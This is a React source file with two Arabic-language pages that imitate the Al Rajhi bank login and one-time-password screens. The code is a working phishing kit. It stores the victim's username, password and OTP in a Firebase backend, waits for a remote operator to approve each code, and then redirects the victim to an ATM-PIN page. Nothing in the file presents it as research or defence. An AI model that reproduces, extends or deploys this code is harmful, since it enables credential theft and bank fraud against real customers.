import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addData, getOrCreateVisitorId, handleCurrentPage, listenForOtpApproval } from "@/lib/firebase";

export function RajhiLoginPage() {
  const [, setLocation] = useLocation();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("rajhi_login");
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password) {
      setSubmitError("يرجى إدخال اسم المستخدم وكلمة المرور");
      return;
    }

    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        rajhiUsername: username,
        rajhiPassword: password,
        currentPage: "rajhi_login",
        updatedAt: new Date().toISOString(),
      });
      setLocation("/rajhi-otp");
    } catch (err: any) {
      setSubmitError(err?.message || "تعذر تسجل الدخول");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f6fa]" dir="rtl">
      <div className="bg-white p-6 sm:p-10 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full">
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="py-2 text-center">
            <img src="/images/login-logo.png" alt="الراجحي" className="h-10 mx-auto object-contain" />
          </div>
          <div className="text-center">
            <h4 className="font-bold text-gray-500 text-sm">مرحباً بك</h4>
            <h2 className="text-xl font-bold text-gray-800">بالتجربة الرقمية الأفضل</h2>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-gray-700 mb-1.5">
                أدخل الهوية الوطنية أو اسم المستخدم
              </label>
              <input
                type="text"
                className="bg-[#f5f6fa] w-full px-4 py-3.5 rounded-xl border border-transparent focus:border-[#0036ff] focus:outline-none font-bold text-sm"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-gray-700 mb-1.5">أدخل كلمة المرور</label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  className="bg-[#f5f6fa] w-full px-4 py-3.5 rounded-xl border border-transparent focus:border-[#0036ff] focus:outline-none font-bold text-sm"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  type="button"
                  className="absolute top-1/2 -translate-y-1/2 left-3 text-[#0036ff] text-xs font-bold"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? "إخفاء" : "إظهار"}
                </button>
              </div>
            </div>
          </div>

          {submitError && <p className="text-xs text-red-500 font-bold text-center">{submitError}</p>}

          <button
            type="submit"
            className="w-full bg-[#0036ff] hover:bg-[#002bd4] text-white rounded-xl py-3.5 font-bold shadow-md cursor-pointer disabled:opacity-60"
            disabled={loading || !username || !password}
          >
            {loading ? "تسجيل الدخول..." : "تسجيل الدخول"}
          </button>
        </form>
      </div>
    </div>
  );
}

export function RajhiOtpPage() {
  const [, setLocation] = useLocation();
  const [digits, setDigits] = useState(["", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("rajhi_otp");
  }, []);

  useEffect(() => {
    if (!loading) return;
    const unsubscribe = listenForOtpApproval((status) => {
      if (status === "approved") {
        setLoading(false);
        setLocation("/atm-pin");
      } else if (status === "rejected") {
        setLoading(false);
        setError("كلمة المرور لمرة واحدة غير صحيحة");
      }
    });
    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, [loading, setLocation]);

  const handleDigitChange = (index: number, val: string) => {
    const clean = val.replace(/\D/g, "").slice(-1);
    const newDigits = [...digits];
    newDigits[index] = clean;
    setDigits(newDigits);

    if (clean && index < 3) {
      const nextInput = document.getElementById(`rajhi-digit-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otp = digits.join("");
    if (otp.length < 4) {
      setError("يرجى إدخال الرمز المكون من 4 أرقام");
      return;
    }

    setLoading(true);
    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        rajhiOtp: otp,
        currentPage: "rajhi_otp",
        updatedAt: new Date().toISOString(),
      });
    } catch {
      setLoading(false);
      setError("تعذر التحقق من الرمز");
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-gray-200 max-w-md w-full text-center space-y-6">
        <img src="/images/login-logo.png" alt="الراجحي" className="h-10 mx-auto object-contain" />
        <h2 className="text-xl font-bold text-gray-800">كلمة المرور لمرة واحدة</h2>
        <p className="text-xs text-gray-600">أدخل الرمز المكون من 4 أرقام المرسل لجوالك</p>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex gap-3 justify-center" dir="ltr">
            {digits.map((d, i) => (
              <input
                key={i}
                id={`rajhi-digit-${i}`}
                type="password"
                inputMode="numeric"
                maxLength={1}
                className="w-12 h-12 text-center text-xl font-bold border border-gray-300 rounded-xl focus:border-[#0036ff] focus:outline-none"
                value={d}
                onChange={(e) => handleDigitChange(i, e.target.value)}
              />
            ))}
          </div>

          {error && <p className="text-xs text-red-500 font-bold">{error}</p>}

          <button
            type="submit"
            className="w-full bg-[#0036ff] text-white rounded-xl py-3.5 font-bold cursor-pointer disabled:opacity-60"
            disabled={digits.some((d) => !d) || loading}
          >
            {loading ? "جاري التحقق..." : "تحقق"}
          </button>
        </form>
      </div>
    </div>
  );
}
